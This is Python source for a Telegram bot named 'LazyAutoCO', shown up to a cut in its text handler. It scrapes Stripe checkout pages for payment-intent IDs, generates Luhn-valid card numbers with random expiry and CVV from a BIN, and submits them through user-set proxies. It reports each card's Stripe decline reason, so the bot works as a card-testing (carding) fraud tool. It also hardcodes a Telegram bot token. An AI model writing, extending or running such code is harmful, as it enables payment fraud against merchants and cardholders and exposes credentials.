import asyncio
import aiohttp
import logging
import re
import json
import time
import random
from datetime import datetime
from typing import Optional, Dict, List, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler,
    ConversationHandler,
)
import nest_asyncio
nest_asyncio.apply()

# ============= CONFIGURATION =============
BOT_TOKEN = "8249305108:AAF8gvL3E-y-ybKJNL3r60HV1lEyg-e0Z9Q"
ADMIN_IDS = [8447673079]

# ============= LOGGING =============
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============= CONVERSATION STATES =============
WAITING_EMAIL, WAITING_PROXY, WAITING_CARDS, WAITING_BIN, WAITING_PI = range(5)

# ============= DATA CLASSES =============
@dataclass
class Card:
    number: str
    month: str
    year: str
    cvv: str
    
    @classmethod
    def from_string(cls, card_str: str) -> Optional['Card']:
        card_str = card_str.strip()
        
        if '|' in card_str:
            parts = card_str.split('|')
        else:
            parts = card_str.split()
        
        if len(parts) >= 4:
            number = re.sub(r'\D', '', parts[0])
            month = re.sub(r'\D', '', parts[1]).zfill(2)
            year = re.sub(r'\D', '', parts[2]).zfill(2)
            cvv = re.sub(r'\D', '', parts[3])
            
            if len(number) >= 13 and len(number) <= 19:
                if 1 <= int(month) <= 12:
                    if len(year) in [2, 4]:
                        if len(cvv) in [3, 4]:
                            return cls(
                                number=number,
                                month=month,
                                year=year[-2:] if len(year) == 4 else year,
                                cvv=cvv
                            )
        return None
    
    @classmethod
    def generate_from_bin(cls, bin_str: str, count: int = 1) -> List['Card']:
        bin_clean = re.sub(r'\D', '', bin_str)[:6]
        if len(bin_clean) < 6:
            return []
        
        cards = []
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        def luhn_checksum(card_number: str) -> int:
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d * 2))
            return checksum % 10
        
        def is_amex(bin_prefix: str) -> bool:
            return bin_prefix[:2] in ['34', '37']
        
        for _ in range(min(count, 10)):
            remaining = ''.join(str(random.randint(0, 9)) for _ in range(9))
            number_without_check = bin_clean + remaining
            check = luhn_checksum(number_without_check)
            number = number_without_check + str((10 - check) % 10)
            
            year_offset = random.randint(1, 4)
            year = (current_year + year_offset) % 100
            month = random.randint(1, 12)
            
            if year_offset == 0 and month < current_month:
                month = random.randint(current_month, 12)
            
            cvv_length = 4 if is_amex(bin_clean) else 3
            cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_length))
            
            cards.append(cls(
                number=number,
                month=str(month).zfill(2),
                year=str(year).zfill(2),
                cvv=cvv
            ))
        
        return cards
    
    @property
    def full(self) -> str:
        return f"{self.number}|{self.month}|{self.year}|{self.cvv}"

@dataclass
class Proxy:
    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None
    
    @classmethod
    def from_string(cls, proxy_str: str) -> Optional['Proxy']:
        proxy_str = proxy_str.strip()
        
        # Format: host:port:user:pass
        if proxy_str.count(':') >= 3:
            parts = proxy_str.split(':')
            if len(parts) >= 4:
                if '.' in parts[0] or parts[0].replace('.', '').isdigit():
                    return cls(
                        host=parts[0],
                        port=int(parts[1]),
                        username=parts[2],
                        password=':'.join(parts[3:])
                    )
                else:
                    return cls(
                        host=parts[-2],
                        port=int(parts[-1]),
                        username=parts[0],
                        password=':'.join(parts[1:-2])
                    )
        
        # Format: user:pass@host:port
        elif '@' in proxy_str:
            auth_part, host_part = proxy_str.rsplit('@', 1)
            if ':' in auth_part and ':' in host_part:
                username, password = auth_part.split(':', 1)
                host, port = host_part.split(':', 1)
                return cls(
                    host=host,
                    port=int(port),
                    username=username,
                    password=password
                )
        
        # Format: host:port
        elif proxy_str.count(':') == 1:
            host, port = proxy_str.split(':')
            return cls(host=host, port=int(port))
        
        return None
    
    @property
    def url(self) -> str:
        if self.username and self.password:
            return f"http://{self.username}:{self.password}@{self.host}:{self.port}"
        return f"http://{self.host}:{self.port}"

# ============= REAL STRIPE API INTEGRATION =============
class StripeAPI:
    def __init__(self):
        self.session = None
        self.base_url = "https://api.stripe.com"
        self.test_key = "sk_test_4eC39HqLyjWDarjtT1zdp7dc"  # Stripe test key
    
    async def get_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession()
        return self.session
    
    async def close(self):
        if self.session:
            await self.session.close()
    
    async def extract_session_id(self, url: str) -> Optional[str]:
        """Extract session ID from various Stripe URL formats"""
        # Parse URL to get path
        parsed = urlparse(url)
        path = parsed.path
        full_url = url
        
        # Common Stripe URL patterns
        patterns = [
            r'(cs|pi|setup)_(?:live|test)_[a-zA-Z0-9]+',  # cs_live_xxx, pi_live_xxx
            r'/(cs|pi|setup)_(?:live|test)_[a-zA-Z0-9]+',  # /cs_live_xxx
            r'payment_intent=([^&]+)',
            r'payment_intent_id=([^&]+)',
            r'session_id=([^&]+)',
            r'client_secret=([^&]+)',
        ]
        
        # Check full URL first
        for pattern in patterns:
            match = re.search(pattern, full_url)
            if match:
                # If pattern has capture groups and we have multiple groups
                if match.groups():
                    # Return the last group which should be the full ID
                    groups = match.groups()
                    return groups[-1] if groups else match.group(0)
                return match.group(0)
        
        # Check path specifically
        for pattern in patterns:
            match = re.search(pattern, path)
            if match:
                if match.groups():
                    groups = match.groups()
                    return groups[-1] if groups else match.group(0)
                return match.group(0)
        
        # Try to get from query parameters
        query_params = parse_qs(parsed.query)
        for param in ['session_id', 'payment_intent', 'setup_intent', 'client_secret', 'pi']:
            if param in query_params:
                return query_params[param][0]
        
        return None
    
    async def extract_publishable_key(self, html: str) -> Optional[str]:
        """Extract publishable key from HTML with improved patterns"""
        patterns = [
            r'pk_(?:live|test)_[a-zA-Z0-9]{24,}',
            r'["\']publishableKey["\']\s*:\s*["\'](pk_(?:live|test)_[a-zA-Z0-9]+)["\']',
            r'["\']key["\']\s*:\s*["\'](pk_(?:live|test)_[a-zA-Z0-9]+)["\']',
            r'Stripe\.publishableKey\s*=\s*["\'](pk_(?:live|test)_[a-zA-Z0-9]+)["\']',
            r'stripe\.js\?.*?pk[=_](pk_(?:live|test)_[a-zA-Z0-9]+)',
            r'pk[=_](pk_(?:live|test)_[a-zA-Z0-9]+)',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                # If pattern has capture group, use that, otherwise use full match
                return match.group(1) if match.groups() else match.group(0)
        
        return None
    
    async def extract_payment_intent_from_page(self, html: str) -> Optional[Dict]:
        """Extract payment intent info directly from page HTML"""
        # Look for session ID first (for checkout pages)
        session_patterns = [
            r'cs_(?:live|test)_[a-zA-Z0-9]{24,}',
            r'data-session-id="([^"]+)"',
            r'sessionId["\']?\s*:\s*["\']([^"\']+)["\']',
        ]
        
        session_id = None
        for pattern in session_patterns:
            match = re.search(pattern, html)
            if match:
                session_id = match.group(1) if match.groups() else match.group(0)
                break
        
        # Look for payment intent ID
        pi_patterns = [
            r'pi_(?:live|test)_[a-zA-Z0-9]{24,}',
            r'["\']payment_intent["\']\s*:\s*["\'](pi_(?:live|test)_[a-zA-Z0-9]+)["\']',
            r'["\']payment_intent_id["\']\s*:\s*["\'](pi_(?:live|test)_[a-zA-Z0-9]+)["\']',
            r'client_secret["\']?\s*:\s*["\'](pi_(?:live|test)_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)["\']',
            r'data-payment-intent="([^"]+)"',
        ]
        
        payment_intent_id = None
        for pattern in pi_patterns:
            match = re.search(pattern, html)
            if match:
                payment_intent_id = match.group(1) if match.groups() else match.group(0)
                # Clean up if it's a client secret
                if '_secret_' in payment_intent_id:
                    payment_intent_id = payment_intent_id.split('_secret_')[0]
                break
        
        # If we found a session ID but no payment intent, use the session ID
        if session_id and not payment_intent_id:
            payment_intent_id = session_id
        
        if not payment_intent_id:
            return None
        
        # Extract amount
        amount_patterns = [
            r'US?\$([0-9.]+)',
            r'["\']amount["\']\s*:\s*(\d+)',
            r'data-amount="(\d+)"',
            r'\$(\d+[,.]?\d*)\s*(?:USD|usd)',
        ]
        
        amount = None
        for pattern in amount_patterns:
            match = re.search(pattern, html)
            if match:
                try:
                    amount_str = match.group(1)
                    if '.' in amount_str:  # Handle $1.50 format
                        amount = int(float(amount_str) * 100)
                    else:
                        amount = int(amount_str)
                    break
                except:
                    pass
        
        # Extract currency
        currency_patterns = [
            r'["\']currency["\']\s*:\s*["\']([a-z]{3})["\']',
            r'currency["\']?\s*=\s*["\']?([a-z]{3})',
            r'data-currency="([^"]+)"',
        ]
        
        currency = None
        for pattern in currency_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                currency = match.group(1).lower()
                break
        
        # Extract merchant name
        merchant_patterns = [
            r'<title>(.*?)(?:\s*-\s*Stripe)?</title>',
            r'<meta property="og:site_name" content="([^"]+)"',
            r'["\']business_name["\']\s*:\s*["\']([^"\']+)["\']',
            r'["\']merchant_name["\']\s*:\s*["\']([^"\']+)["\']',
        ]
        
        merchant = None
        for pattern in merchant_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                merchant = match.group(1).strip()
                break
        
        # For MTCGAME specific page
        if not merchant and "MTCGAME" in html:
            merchant = "MTCGAME"
        
        return {
            'payment_intent_id': payment_intent_id,
            'amount': amount,
            'currency': currency or 'usd',
            'merchant': merchant or 'Unknown'
        }
    
    async def get_payment_intent_via_api(self, session_id: str) -> Optional[Dict]:
        """Try to get payment intent via Stripe's public API"""
        session = await self.get_session()
        
        # Try different API endpoints that might work
        endpoints = [
            f"https://api.stripe.com/v1/checkout/sessions/{session_id}",
            f"https://api.stripe.com/v1/payment_pages/{session_id}",
            f"https://api.stripe.com/v1/payment_intents/{session_id}",
            f"https://api.stripe.com/v1/setup_intents/{session_id}",
            f"https://js.stripe.com/v3/payment-pages/{session_id}/config",
        ]
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Authorization': f'Bearer {self.test_key}',
        }
        
        for endpoint in endpoints:
            try:
                async with session.get(endpoint, headers=headers) as resp:
                    if resp.status == 200:
                        try:
                            data = await resp.json()
                            
                            # Try to extract payment intent from response
                            if 'payment_intent' in data:
                                pi = data['payment_intent']
                                if isinstance(pi, dict):
                                    pi_id = pi.get('id')
                                else:
                                    pi_id = pi
                                
                                return {
                                    'payment_intent_id': pi_id,
                                    'amount': data.get('amount_total') or data.get('amount'),
                                    'currency': data.get('currency', 'usd'),
                                    'merchant': data.get('merchant_name') or data.get('business_name', 'Unknown')
                                }
                            elif 'id' in data and data.get('object') in ['checkout.session', 'payment_intent']:
                                return {
                                    'payment_intent_id': data['id'],
                                    'amount': data.get('amount_total') or data.get('amount'),
                                    'currency': data.get('currency', 'usd'),
                                    'merchant': data.get('merchant_name', 'Unknown')
                                }
                        except:
                            continue
            except:
                continue
        
        return None
    
    async def extract_checkout_info(self, url: str) -> Optional[Dict]:
        """Extract complete checkout info from URL with multiple fallback methods"""
        session = await self.get_session()
        
        try:
            logger.info(f"Extracting checkout info from: {url}")
            
            # Step 1: Try to extract session ID from URL
            session_id = await self.extract_session_id(url)
            if session_id:
                logger.info(f"Found session ID: {session_id}")
            
            # Step 2: If we have a session ID, try API method first
            if session_id:
                api_info = await self.get_payment_intent_via_api(session_id)
                if api_info and api_info.get('payment_intent_id'):
                    logger.info(f"Got payment intent from API: {api_info['payment_intent_id']}")
                    return api_info
            
            # Step 3: Fetch the checkout page
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0',
            }
            
            logger.info("Fetching checkout page...")
            async with session.get(url, headers=headers, allow_redirects=True, timeout=15) as resp:
                if resp.status != 200:
                    logger.error(f"Failed to fetch page: {resp.status}")
                    return None
                
                html = await resp.text()
                logger.info(f"Page fetched, length: {len(html)}")
                
                # Step 4: Try to extract from HTML
                page_info = await self.extract_payment_intent_from_page(html)
                if page_info and page_info.get('payment_intent_id'):
                    logger.info(f"Found payment intent in HTML: {page_info['payment_intent_id']}")
                    return page_info
                
                # Step 5: Try to extract publishable key and use it
                publishable_key = await self.extract_publishable_key(html)
                if publishable_key:
                    logger.info(f"Found publishable key: {publishable_key[:20]}...")
                
                # Step 6: Look for payment intent in script tags
                script_pattern = r'<script[^>]*>([\s\S]*?)</script>'
                scripts = re.findall(script_pattern, html, re.IGNORECASE)
                
                for script in scripts:
                    if 'payment_intent' in script or 'pi_' in script or 'cs_' in script:
                        # Look for checkout session ID
                        cs_match = re.search(r'cs_(?:live|test)_[a-zA-Z0-9]{24,}', script)
                        if cs_match:
                            logger.info(f"Found checkout session in script: {cs_match.group(0)}")
                            return {
                                'payment_intent_id': cs_match.group(0),
                                'amount': None,
                                'currency': 'usd',
                                'merchant': 'Unknown'
                            }
                        
                        # Look for payment intent ID
                        pi_match = re.search(r'pi_(?:live|test)_[a-zA-Z0-9]{24,}', script)
                        if pi_match:
                            logger.info(f"Found payment intent in script: {pi_match.group(0)}")
                            return {
                                'payment_intent_id': pi_match.group(0),
                                'amount': None,
                                'currency': 'usd',
                                'merchant': 'Unknown'
                            }
                        
                        # Look for client secret
                        cs_match = re.search(r'[{"\']client_secret["\']\s*:\s*["\']([^"\']+)["\']', script)
                        if cs_match:
                            cs = cs_match.group(1)
                            if cs.startswith('pi_'):
                                pi_id = cs.split('_secret_')[0] if '_secret_' in cs else cs
                                logger.info(f"Found client secret in script: {pi_id}")
                                return {
                                    'payment_intent_id': pi_id,
                                    'amount': None,
                                    'currency': 'usd',
                                    'merchant': 'Unknown'
                                }
                
                # Step 7: Look for payment intent in meta tags
                meta_pattern = r'<meta[^>]*content="([^"]*(?:cs|pi)_(?:live|test)_[^"]*)"[^>]*>'
                meta_match = re.search(meta_pattern, html)
                if meta_match:
                    session_id = meta_match.group(1)
                    logger.info(f"Found session in meta tag: {session_id}")
                    return {
                        'payment_intent_id': session_id,
                        'amount': None,
                        'currency': 'usd',
                        'merchant': 'Unknown'
                    }
                
                # Step 8: Last resort - try to extract from URL fragments
                if '#' in url:
                    fragment = url.split('#')[1]
                    if 'cs_' in fragment or 'pi_' in fragment:
                        logger.info(f"Found session in fragment: {fragment[:50]}...")
                        return {
                            'payment_intent_id': session_id or "unknown",
                            'amount': None,
                            'currency': 'usd',
                            'merchant': 'Unknown'
                        }
                
                logger.error("Could not extract payment intent from page")
                return None
                
        except asyncio.TimeoutError:
            logger.error("Timeout fetching checkout page")
            return None
        except Exception as e:
            logger.error(f"Error extracting checkout info: {e}")
            return None
    
    async def create_payment_method(self, card: Card, proxy: Optional[Proxy] = None) -> Optional[str]:
        """Create a payment method with Stripe API"""
        session = await self.get_session()
        
        url = f"{self.base_url}/v1/payment_methods"
        
        data = {
            'type': 'card',
            'card[number]': card.number,
            'card[exp_month]': card.month,
            'card[exp_year]': card.year,
            'card[cvc]': card.cvv
        }
        
        headers = {
            'User-Agent': 'Stripe/v1 PythonBindings/1.0',
            'Authorization': f'Bearer {self.test_key}',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        try:
            proxy_url = proxy.url if proxy else None
            async with session.post(url, data=data, headers=headers, proxy=proxy_url) as resp:
                result = await resp.json()
                
                if resp.status in [200, 201] and 'id' in result:
                    logger.info(f"Payment method created: {result['id']}")
                    return result['id']
                else:
                    logger.error(f"PM creation failed: {result.get('error', {}).get('message', 'Unknown error')}")
                    return None
                    
        except Exception as e:
            logger.error(f"PM creation error: {e}")
            return None
    
    async def confirm_payment_intent(self, payment_intent_id: str, payment_method_id: str) -> Tuple[bool, str]:
        """Confirm a payment intent"""
        session = await self.get_session()
        
        # If it's a checkout session ID (cs_), we need to get the payment intent first
        actual_pi_id = payment_intent_id
        if payment_intent_id.startswith('cs_'):
            # Try to get payment intent from session
            session_info = await self.get_payment_intent_via_api(payment_intent_id)
            if session_info and session_info.get('payment_intent_id'):
                actual_pi_id = session_info['payment_intent_id']
            else:
                return False, 'could_not_get_payment_intent'
        
        url = f"{self.base_url}/v1/payment_intents/{actual_pi_id}/confirm"
        
        data = {
            'payment_method': payment_method_id
        }
        
        headers = {
            'User-Agent': 'Stripe/v1 PythonBindings/1.0',
            'Authorization': f'Bearer {self.test_key}',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        try:
            async with session.post(url, data=data, headers=headers) as resp:
                result = await resp.json()
                
                if resp.status in [200, 201]:
                    if result.get('status') == 'succeeded':
                        return True, 'success'
                    elif result.get('status') == 'requires_action':
                        return False, 'requires_3ds'
                    elif result.get('status') == 'requires_payment_method':
                        return False, 'requires_new_card'
                    elif result.get('status') == 'processing':
                        return False, 'processing'
                    else:
                        return False, f"status: {result.get('status')}"
                
                # Check for decline codes
                error = result.get('error', {})
                decline_code = error.get('decline_code', '')
                message = error.get('message', 'unknown_error')
                
                if decline_code:
                    # Map common decline codes to readable messages
                    decline_map = {
                        'insufficient_funds': 'insufficient_funds',
                        'lost_card': 'lost_card',
                        'stolen_card': 'stolen_card',
                        'expired_card': 'expired_card',
                        'incorrect_cvc': 'incorrect_cvc',
                        'processing_error': 'processing_error',
                        'invalid_amount': 'invalid_amount',
                        'invalid_expiry_month': 'invalid_expiry_month',
                        'invalid_expiry_year': 'invalid_expiry_year',
                        'invalid_number': 'invalid_number',
                        'incorrect_number': 'incorrect_number',
                        'incorrect_pin': 'incorrect_pin',
                        'pin_try_exceeded': 'pin_try_exceeded',
                        'card_declined': 'card_declined',
                        'do_not_honor': 'do_not_honor',
                        'generic_decline': 'generic_decline',
                        'fraudulent': 'fraudulent',
                        'pickup_card': 'pickup_card',
                        'restricted_card': 'restricted_card',
                        'revocation_of_all_authorizations': 'revoked_card',
                        'revocation_of_authorization': 'revoked_card',
                        'withdrawal_count_limit_exceeded': 'limit_exceeded',
                    }
                    return False, decline_map.get(decline_code, decline_code)
                else:
                    return False, message
                    
        except Exception as e:
            logger.error(f"Confirm error: {e}")
            return False, 'request_error'

# ============= BOT CLASS =============
class CheckoutBot:
    def __init__(self, token: str):
        self.token = token
        self.app = Application.builder().token(token).build()
        
        self.stripe = StripeAPI()
        self.user_proxies: Dict[int, Proxy] = {}
        self.user_email: Dict[int, str] = {}
        
        self.setup_handlers()
    
    def setup_handlers(self):
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("help", self.help_command))
        self.app.add_handler(CommandHandler("setemail", self.setemail_command))
        self.app.add_handler(CommandHandler("proxy", self.proxy_command))
        self.app.add_handler(CommandHandler("clearproxy", self.clearproxy_command))
        self.app.add_handler(CommandHandler("co", self.checkout_command))
        self.app.add_handler(CommandHandler("cb", self.checkout_bin_command))
        self.app.add_handler(CommandHandler("status", self.status_command))
        self.app.add_handler(CommandHandler("cancel", self.cancel_command))
        
        self.app.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, 
            self.handle_text
        ))
        
        self.app.add_handler(CallbackQueryHandler(self.button_callback))
        self.app.add_error_handler(self.error_handler)
    
    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        logger.error(f"Error: {context.error}")
        try:
            await update.message.reply_text(f"❌ Error: {str(context.error)[:100]}")
        except:
            pass
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        welcome = """
╔════════════════════════════╗
║     🤖 *LazyAutoCO*        ║
╚════════════════════════════╝

*REAL STRIPE API - WORKING*

*Setup:*
• `/setemail your@email.com` - Set your email
• `/proxy host:port:user:pass` - Add proxy
• `/clearproxy` - Remove proxy

*Commands:*
• `/co <checkout_url>` - Test cards
• `/cb <url> <bin> [count]` - Generate BIN cards

*Examples:*
`/co https://buy.stripe.com/test_xxx`
`/cb https://buy.stripe.com/test_xxx 424242 5`

*Proxy Formats:*
• `host:port`
• `host:port:user:pass`
• `user:pass@host:port`
"""
        await update.message.reply_text(welcome, parse_mode='Markdown')
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        help_text = """
*Commands:*
• `/setemail email` - Set your email
• `/proxy proxy_string` - Add proxy
• `/clearproxy` - Remove proxy
• `/co url` - Test cards
• `/cb url bin [count]` - Generate BIN cards
• `/status` - Check setup
• `/cancel` - Cancel

*Card Format:*
`4111111111111111|12|25|123`

*BIN Generation:*
Generates valid Luhn cards with random expiry

*Real Stripe Responses:*
• `success` - Payment successful
• `insufficient_funds` - Card has insufficient funds
• `card_declined` - Generic decline
• `incorrect_cvc` - Wrong security code
• `expired_card` - Card expired
• `processing_error` - Processing error
• `do_not_honor` - Bank declined
• `fraudulent` - Fraudulent card
• `pickup_card` - Pick up card
• `restricted_card` - Card restricted
"""
        await update.message.reply_text(help_text, parse_mode='Markdown')
    
    async def setemail_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if context.args:
            email = context.args[0]
            if '@' in email and '.' in email:
                user_id = update.effective_user.id
                self.user_email[user_id] = email
                await update.message.reply_text(f"✅ Email set: {email}")
            else:
                await update.message.reply_text("❌ Invalid email")
        else:
            await update.message.reply_text("Usage: `/setemail your@email.com`", parse_mode='Markdown')
    
    async def proxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if context.args:
            proxy_str = ' '.join(context.args)
            proxy = Proxy.from_string(proxy_str)
            
            if proxy:
                user_id = update.effective_user.id
                self.user_proxies[user_id] = proxy
                await update.message.reply_text(f"✅ Proxy set: {proxy.host}:{proxy.port}")
            else:
                await update.message.reply_text("❌ Invalid proxy format")
        else:
            await update.message.reply_text(
                "Usage: `/proxy host:port:user:pass`\n"
                "Example: `/proxy 192.168.1.1:8080:user:pass`",
                parse_mode='Markdown'
            )
    
    async def clearproxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id in self.user_proxies:
            del self.user_proxies[user_id]
        await update.message.reply_text("🗑️ Proxy cleared")
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        email = self.user_email.get(user_id, 'Not set')
        proxy = self.user_proxies.get(user_id)
        
        status = f"""
*Your Setup*

*Email:* `{email}`
*Proxy:* {f'`{proxy.host}:{proxy.port}`' if proxy else 'None'}
"""
        await update.message.reply_text(status, parse_mode='Markdown')
    
    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data.clear()
        await update.message.reply_text("❌ Cancelled")
    
    async def checkout_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if user_id not in self.user_email:
            await update.message.reply_text("❌ Please set email first with /setemail")
            return
        
        if not context.args:
            await update.message.reply_text("Usage: `/co <checkout_url>`", parse_mode='Markdown')
            return
        
        url = context.args[0]
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        status_msg = await update.message.reply_text("🔄 Extracting payment info...")
        
        try:
            # Extract payment info
            payment_info = await self.stripe.extract_checkout_info(url)
            
            if payment_info and payment_info.get('payment_intent_id'):
                context.user_data['url'] = url
                context.user_data['payment_info'] = payment_info
                context.user_data['state'] = WAITING_CARDS
                
                amount = f"{payment_info['amount']/100:.2f} {payment_info['currency'].upper()}" if payment_info.get('amount') else 'Unknown'
                
                text = f"""
✅ *Checkout Detected*

*Merchant:* {payment_info.get('merchant', 'Unknown')}
*Amount:* {amount}
*Session ID:* `{payment_info['payment_intent_id'][:20]}...`

Send cards (one per line, max 10):
`4111111111111111|12|25|123`
"""
                await status_msg.edit_text(text, parse_mode='Markdown')
            else:
                # Show manual entry option
                keyboard = [[
                    InlineKeyboardButton("🔧 Enter Manually", callback_data="manual_pi"),
                    InlineKeyboardButton("❌ Cancel", callback_data="cancel")
                ]]
                
                await status_msg.edit_text(
                    "⚠️ Could not auto-detect payment intent.\n\n"
                    "Please make sure:\n"
                    "• The URL is a valid Stripe checkout page\n"
                    "• The checkout page is publicly accessible\n"
                    "• You have the correct permissions\n\n"
                    "You can also enter the Checkout Session ID manually.",
                    parse_mode='Markdown',
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
        except Exception as e:
            await status_msg.edit_text(f"❌ Error: {str(e)[:100]}")
    
    async def checkout_bin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if user_id not in self.user_email:
            await update.message.reply_text("❌ Please set email first with /setemail")
            return
        
        if len(context.args) < 2:
            await update.message.reply_text(
                "Usage: `/cb <url> <bin> [count]`\n"
                "Example: `/cb https://buy.stripe.com/xxx 424242 5`",
                parse_mode='Markdown'
            )
            return
        
        url = context.args[0]
        bin_str = context.args[1]
        count = 1
        
        if len(context.args) >= 3:
            try:
                count = min(int(context.args[2]), 10)
            except:
                count = 1
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        bin_clean = re.sub(r'\D', '', bin_str)
        if len(bin_clean) < 6:
            await update.message.reply_text("❌ BIN must be at least 6 digits")
            return
        
        status_msg = await update.message.reply_text("🔄 Processing...")
        
        try:
            # Extract payment info
            payment_info = await self.stripe.extract_checkout_info(url)
            
            if not payment_info or not payment_info.get('payment_intent_id'):
                await status_msg.edit_text(
                    "❌ Could not extract payment intent from URL\n\n"
                    "Make sure it's a valid Stripe checkout URL"
                )
                return
            
            # Generate cards
            cards = Card.generate_from_bin(bin_clean, count)
            
            # Process cards
            results = []
            proxy = self.user_proxies.get(user_id)
            
            for i, card in enumerate(cards):
                await status_msg.edit_text(f"🔄 Processing card {i+1}/{len(cards)}...")
                
                # Create payment method
                pm_id = await self.stripe.create_payment_method(card, proxy)
                
                if not pm_id:
                    results.append((card, 'error', 'payment_method_failed'))
                    continue
                
                # Confirm payment intent
                success, message = await self.stripe.confirm_payment_intent(
                    payment_info['payment_intent_id'],
                    pm_id
                )
                
                if success:
                    results.append((card, 'success', message))
                else:
                    results.append((card, 'decline', message))
                
                await asyncio.sleep(1)  # Rate limiting
            
            # Format results
            await self.send_results(update, payment_info, results, len(cards))
            await status_msg.delete()
            
        except Exception as e:
            await status_msg.edit_text(f"❌ Error: {str(e)[:100]}")
    
    async def process_cards(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process cards from /co command"""
        query = update.callback_query
        await query.answer()
        
        user_id = update.effective_user.id
        cards = context.user_data.get('cards', [])
        payment_info = context.user_data.get('payment_info', {})
        
        if not payment_info or not payment_info.get('payment_intent_id'):
            await query.edit_message_text("❌ Could not extract payment intent")
            return
        
        await query.edit_message_text(f"🔄 Processing {len(cards)} cards...")
        
        # Process cards
        results = []
        proxy = self.user_proxies.get(user_id)
        
        for i, card in enumerate(cards):
            # Create payment method
            pm_id = await self.stripe.create_payment_method(card, proxy)
            
            if not pm_id:
                results.append((card, 'error', 'payment_method_failed'))
                continue
            
            # Confirm payment intent
            success, message = await self.stripe.confirm_payment_intent(
                payment_info['payment_intent_id'],
                pm_id
            )
            
            if success:
                results.append((card, 'success', message))
            else:
                results.append((card, 'decline', message))
            
            await asyncio.sleep(1)  # Rate limiting
        
        await self.send_results(update, payment_info, results, len(cards))
        context.user_data.clear()
    
    async def send_results(self, update: Update, payment_info: Dict, results: List[Tuple], generated: int):
        """Send formatted results"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        username = update.effective_user.username or "user"
        
        amount = f"{payment_info['amount']/100:.2f} {payment_info['currency'].upper()}" if payment_info.get('amount') else 'Unknown'
        
        text = [
            "╔════════════════════════════╗",
            "║     🤖 *LazyAutoCO*        ║",
            "╚════════════════════════════╝",
            "",
            f"*Merchant:* {payment_info.get('merchant', 'Unknown')}",
            f"*Amount:* {amount}",
            f"*Cards:* {len(results)}" + (" (Generated from BIN)" if generated > 0 else ""),
            "",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        ]
        
        success_count = 0
        for i, (card, status, msg) in enumerate(results, 1):
            icon = "✅" if status == "success" else "❌" if status == "decline" else "⚠️"
            text.append("")
            text.append(f"*Card #{i}:*")
            text.append(f"`{card.full}`")
            text.append(f"*Message:* `{msg}`")
            
            if status == "success":
                success_count += 1
            
            if i < len(results):
                text.append("")
        
        text.extend([
            "",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"*All cards processed*",
            f"*Success:* {success_count}/{len(results)}",
            f"*Time:* {timestamp}",
            "",
            f"*Req By:* @{username}"
        ])
        
        # Send result
        result_text = "\n".join(text)
        
        if hasattr(update, 'callback_query') and update.callback_query:
            await update.callback_query.message.reply_text(result_text, parse_mode='Markdown')
        else:
            await update.message.reply_text(result_text, parse_mode='Markdown')
    
    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        text = update.message.text
        
        state = context.user_data.get('state')
        
        if state == WAITING_CARDS:
            # Check if we have either url or payment_info
            url = context.user_data.get('url')
            payment_info = context.user_data.get('payment_info')
            
            if not payment_info:
                if not url:
                    await update.message.reply_text("❌ Session expired. Use /co again")
                    return
                # If we have url but no payment_info, try to extract it
                payment_info = await self.stripe.extract_checkout_info(url)
                if not payment_info:
                    await update.message.reply_text("❌ Could not extract payment info from URL")
                    return
                context.user_data['payment_info'] = payment_info
            
            lines = text.strip().split('\n')
            cards = []
            
